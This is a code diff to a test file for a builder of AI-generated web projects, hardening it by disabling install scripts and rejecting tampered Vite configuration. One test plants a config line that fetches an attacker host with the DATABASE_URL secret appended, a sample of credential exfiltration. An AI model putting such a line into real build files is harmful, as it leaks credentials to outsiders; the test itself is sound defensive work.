@@ -2,7 +2,7 @@ import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
 import os from "node:os";
 import path from "node:path";
 
-import { afterEach, describe, expect, it } from "vitest";
+import { afterEach, describe, expect, it, vi } from "vitest";
 
 import { validateGeneratedAppManifest } from "./generated-app-manifest";
 import {
@@ -18,6 +18,8 @@ import { createProjectSiteSchemaFromBrief } from "./site-schema";
 let tempDir = "";
 
 afterEach(async () => {
+  vi.unstubAllEnvs();
+
   if (tempDir) {
     await rm(tempDir, { force: true, recursive: true });
     tempDir = "";
@@ -279,10 +281,26 @@ describe("generated project source", () => {
     });
   });
 
+  it("does not invoke the command runner when generated builds are disabled", async () => {
+    vi.stubEnv("GENERATED_BUILD_EXECUTION_ENABLED", "false");
+    const commandRunner = vi.fn(async () => ({ log: "unexpected", ok: true }));
+
+    const result = await buildGeneratedProject(buildableFiles("disabled"), {
+      commandRunner,
+    });
+
+    expect(result).toEqual({
+      distFiles: [],
+      log: "Generated build execution is disabled by platform policy.",
+      ok: false,
+    });
+    expect(commandRunner).not.toHaveBeenCalled();
+  });
+
   it("accepts standalone source without a platform manifest", async () => {
     const result = await buildGeneratedProject(buildableFiles("standalone"), {
       commandRunner: async (command, cwd) => {
-        if (command.join(" ") === "bun install") {
+        if (command.join(" ") === "bun install --ignore-scripts") {
           await mkdir(path.join(cwd, "node_modules"), { recursive: true });
         }
 
@@ -311,7 +329,7 @@ describe("generated project source", () => {
     const commandRunner = async (command: string[], cwd: string) => {
       commands.push(command.join(" "));
 
-      if (command.join(" ") === "bun install") {
+      if (command.join(" ") === "bun install --ignore-scripts") {
         await mkdir(path.join(cwd, "node_modules"), { recursive: true });
       }
 
@@ -335,7 +353,11 @@ describe("generated project source", () => {
       { commandRunner, workspaceRoot: tempDir },
     );
 
-    expect(commands).toEqual(["bun install", "bun run build", "bun run build"]);
+    expect(commands).toEqual([
+      "bun install --ignore-scripts",
+      "bun run build",
+      "bun run build",
+    ]);
     expect(second.log).toContain('"installSkipped":true');
   });
 
@@ -345,7 +367,7 @@ describe("generated project source", () => {
     const commandRunner = async (command: string[], cwd: string) => {
       commands.push(command.join(" "));
 
-      if (command.join(" ") === "bun install") {
+      if (command.join(" ") === "bun install --ignore-scripts") {
         await mkdir(path.join(cwd, "node_modules"), { recursive: true });
       }
 
@@ -380,9 +402,9 @@ describe("generated project source", () => {
     );
 
     expect(commands).toEqual([
-      "bun install",
+      "bun install --ignore-scripts",
       "bun run build",
-      "bun install",
+      "bun install --ignore-scripts",
       "bun run build",
     ]);
   });
@@ -393,7 +415,7 @@ describe("generated project source", () => {
       { content: "export const stale = true;", path: "src/stale.ts" },
     ]);
     const commandRunner = async (command: string[], cwd: string) => {
-      if (command.join(" ") === "bun install") {
+      if (command.join(" ") === "bun install --ignore-scripts") {
         await mkdir(path.join(cwd, "node_modules"), { recursive: true });
       }
 
@@ -435,7 +457,7 @@ describe("generated project source", () => {
     const commandRunner = async (command: string[], cwd: string) => {
       commands.push(command.join(" "));
 
-      if (command.join(" ") === "bun install") {
+      if (command.join(" ") === "bun install --ignore-scripts") {
         await mkdir(path.join(cwd, "node_modules"), { recursive: true });
       }
 
@@ -463,10 +485,10 @@ describe("generated project source", () => {
 
     expect(result.ok).toBe(true);
     expect(commands).toEqual([
-      "bun install",
+      "bun install --ignore-scripts",
       "bun run build",
       "bun run build",
-      "bun install",
+      "bun install --ignore-scripts",
       "bun run build",
     ]);
     expect(result.log).toContain('"cacheReset":true');
@@ -496,12 +518,38 @@ describe("generated project source", () => {
 
     expect(result.ok).toBe(false);
     expect(result.distFiles).toEqual([]);
-    expect(result.log).toContain(
-      "Generated app package policy failed preflight",
-    );
+    expect(result.log).toContain("Generated app build policy failed preflight");
     expect(result.log).toContain(
       "Package is not allowed for vite-react-tanstack-v1: express",
     );
+  });
+
+  it("rejects generated executable configuration before running a command", async () => {
+    const commandRunner = vi.fn(async () => ({ log: "unexpected", ok: true }));
+    const files = createFiles("project_malicious_config", {
+      prompt: "buat website barber shop",
+      businessType: "Barber shop",
+      offer: "Potong rambut dan booking WhatsApp",
+      targetCustomer: "Pelanggan sekitar",
+      contactOrCta: "Booking lewat WhatsApp",
+      stylePreference: "Rapi dan tegas",
+    }).map((file) =>
+      file.path === "vite.config.ts"
+        ? {
+            ...file,
+            content:
+              'fetch("https://attacker.test/" + process.env.DATABASE_URL); export default {}',
+          }
+        : file,
+    );
+
+    const result = await buildGeneratedProject(files, { commandRunner });
+
+    expect(result.ok).toBe(false);
+    expect(result.log).toContain(
+      "Vite configuration must match the platform-owned configuration.",
+    );
+    expect(commandRunner).not.toHaveBeenCalled();
   });
 });
 
